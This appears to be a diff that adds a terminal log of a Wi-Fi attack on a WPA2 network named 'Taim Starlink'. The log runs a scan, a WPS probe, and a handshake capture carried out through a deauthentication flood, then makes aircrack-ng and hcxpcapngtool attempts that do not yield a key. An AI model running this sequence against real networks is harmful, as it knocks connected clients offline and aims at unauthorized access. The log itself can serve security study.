@@ -1,0 +1,186 @@
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo iw dev wlp4s0 scan | grep -A45 -i "SSID: Taim Starlink"
+	SSID: Taim Starlink\x20
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 9.0 18.0 36.0 54.0 
+	DS Parameter set: channel 11
+	ERP: <no flags>
+	Extended supported rates: 6.0 12.0 24.0 48.0 
+	HT capabilities:
+		Capabilities: 0x11ee
+			HT20/HT40
+			SM Power Save disabled
+			RX HT20 SGI
+			RX HT40 SGI
+			TX STBC
+			RX STBC 1-stream
+			Max AMSDU length: 3839 bytes
+			DSSS/CCK HT40
+		Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
+		Minimum RX AMPDU time spacing: 4 usec (0x05)
+		HT RX MCS rate indexes supported: 0-15, 32
+		HT TX MCS rate indexes are undefined
+	HT operation:
+		 * primary channel: 11
+		 * secondary channel offset: below
+		 * STA channel width: any
+		 * RIFS: 0
+		 * HT protection: 20 MHz
+		 * non-GF present: 1
+		 * OBSS non-GF present: 0
+		 * dual beacon: 0
+		 * dual CTS protection: 0
+		 * STBC beacon: 0
+		 * L-SIG TXOP Prot: 0
+		 * PCO active: 0
+		 * PCO phase: 0
+	WPA:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Extended capabilities:
+	BSS Load:
+		 * station count: 4
+		 * channel utilisation: 0/255
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo wash -i wlp4s0mon -c 11 -a -F
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+--------------------------------------------------------------------------------
+80:AF:CA:CA:A3:D3   11  -63            RalinkTe  Taim Starlink 
+82:AF:CA:EA:A3:D3   11  -63            RalinkTe  (null)
+^C
+
+
+
+
+
+ CH 11 ][ Elapsed: 42 s ][ 2026-05-09 02:32 ][ WPA handshake: 80:AF:CA:CA:A3:D3 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 80:AF:CA:CA:A3:D3  -61  72      433      753   40  11  270   WPA2 CCMP   PSK  Taim Starlink                             
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 80:AF:CA:CA:A3:D3  D6:08:7D:3F:4B:85  -80    2e- 6e   156       11                                                       
+ 80:AF:CA:CA:A3:D3  3A:93:CD:6F:AB:34  -80    1e- 1e     0       12                                                       
+ 80:AF:CA:CA:A3:D3  04:10:6B:46:59:9E  -85    6e- 1      0       19                                                       
+ 80:AF:CA:CA:A3:D3  3E:4F:AE:61:46:3F  -67    2e- 1e  1228     1180  EAPOL                                                
+
+ MAC                 CH PWR    ACK ACK/s    CTS RTS_RX RTS_TX  OTHER
+                                                                                                                         
+ 3E:4F:AE:61:46:3F   11 -61    338     3      0     49      0    204
+ 80:AF:CA:CA:A3:D3   11 -67     35     0     51      0     57    239
+ 04:60:10:00:00:00   11 -61      0     0      0      0      0     57
+ 04:40:20:01:00:00   11 -62      0     0      0      0      0     46
+ 04:00:B0:7E:00:00   11 -62      0     0      0      0      0      2
+ 04:30:C0:00:00:00   11 -62      0     0      0      0      0     53
+ 04:00:E0:7E:00:00   11 -61      0     0      0      0      0      2
+ 04:00:00:7F:00:00   11 -61      0     0      0      0      0      2
+ 04:00:30:7F:00:00   11 -61      0     0      0      0      0      1
+ 04:00:60:7F:00:00   11 -61      0     0      0      0      0      1
+ 04:00:70:7F:00:00   11 -62      0     0      0      0      0      3
+ 04:00:40:3E:00:00   11 -68      0     0      0      0      0      2
+Quitting...
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ aircrack-ng taim_client_3e_test-01.cap
+Reading packets, please wait...
+Opening taim_client_3e_test-01.cap
+Read 3043 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  80:AF:CA:CA:A3:D3  Taim Starlink             WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening taim_client_3e_test-01.cap
+Read 3043 packets.
+
+1 potential targets
+
+Please specify a dictionary (option -w).
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ hcxpcapngtool taim_client_3e_test-01.cap
+hcxpcapngtool 6.2.7 reading from taim_client_3e_test-01.cap...
+
+summary capture file
+--------------------
+file name................................: taim_client_3e_test-01.cap
+version (pcap/cap).......................: 2.4 (very basic format without any additional information)
+timestamp minimum (GMT)..................: 09.05.2026 02:32:05
+timestamp maximum (GMT)..................: 09.05.2026 02:32:50
+used capture interfaces..................: 1
+link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
+endianness (capture system)...............: little endian
+packets inside...........................: 3043
+ESSID (total unique).....................: 1
+BEACON (total)...........................: 1
+BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
+ACTION (total)...........................: 6
+PROBERESPONSE (total)....................: 22
+DEAUTHENTICATION (total).................: 768
+AUTHENTICATION (total)...................: 3
+AUTHENTICATION (OPEN SYSTEM).............: 3
+ASSOCIATIONREQUEST (total)...............: 2
+ASSOCIATIONREQUEST (PSK).................: 2
+WPA encrypted............................: 749
+EAPOL messages (total)...................: 4
+EAPOL RSN messages.......................: 4
+EAPOLTIME gap (measured maximum usec)....: 16012
+EAPOL ANONCE error corrections (NC)......: not detected
+EAPOL M1 messages (total)................: 1
+EAPOL M2 messages (total)................: 1
+EAPOL M3 messages (total)................: 1
+EAPOL M4 messages (total)................: 1
+EAPOL pairs (total)......................: 2
+EAPOL pairs (best).......................: 1
+EAPOL M32E2 (authorized).................: 1
+
+frequency statistics from radiotap header (frequency: received packets)
+-----------------------------------------------------------------------
+not available due to missing radiotap header
+
+Information: no hashes written to hash files
+
+Warning: too many deauthentication/disassociation frames detected!
+That can cause that an ACCESS POINT change channel, reset EAPOL TIMER,
+renew ANONCE and set PMKID to zero.
+This could prevent to calculate a valid EAPOL MESSAGE PAIR
+or to get a valid PMKID.
+
+Information: limited dump file format detected!
+This file format is a very basic format to save captured network data.
+It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
+The PCAP Next Generation dump file format is an attempt to overcome the limitations
+of the currently widely used (but limited) libpcap (cap, pcap) format.
+https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
+https://github.com/pcapng/pcapng
+
+Information: radiotap header is missing!
+Radiotap is a de facto standard for 802.11 frame injection and reception.
+The radiotap header format is a mechanism to supply additional information about frames,
+from the driver to userspace applications.
+https://www.radiotap.org/
+
+Information: missing frames!
+This dump file does not contain undirected proberequest frames.
+An undirected proberequest may contain information about the PSK.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it hard to recover the PSK.
+
+Information: missing frames!
+This dump file does not contain enough EAPOL M1 frames.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it impossible to calculate nonce-error-correction values.
+
+
+session summary
+---------------
+processed cap files...................: 1
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ 
